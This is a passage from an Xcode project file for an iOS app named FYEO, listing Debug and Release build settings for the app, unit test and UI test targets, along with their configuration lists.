				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		70D0D49C2F25DAA900BB29E5 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		70D0D49E2F25DAA900BB29E5 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 893ARLPD66;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEOTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FYEO.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/FYEO";
			};
			name = Debug;
		};
		70D0D49F2F25DAA900BB29E5 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 893ARLPD66;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEOTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/FYEO.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/FYEO";
			};
			name = Release;
		};
		70D0D4A12F25DAA900BB29E5 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 893ARLPD66;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEOUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = FYEO;
			};
			name = Debug;
		};
		70D0D4A22F25DAA900BB29E5 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 893ARLPD66;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEOUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = FYEO;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		70D0D46A2F25DAA700BB29E5 /* Build configuration list for PBXProject "FYEO" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				70D0D49B2F25DAA900BB29E5 /* Debug */,
				70D0D49C2F25DAA900BB29E5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		70D0D4982F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEO" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				70D0D4992F25DAA900BB29E5 /* Debug */,
				70D0D49A2F25DAA900BB29E5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		70D0D49D2F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				70D0D49E2F25DAA900BB29E5 /* Debug */,
				70D0D49F2F25DAA900BB29E5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		70D0D4A02F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				70D0D4A12F25DAA900BB29E5 /* Debug */,
				70D0D4A22F25DAA900BB29E5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 70D0D4672F25DAA700BB29E5 /* Project object */;
}
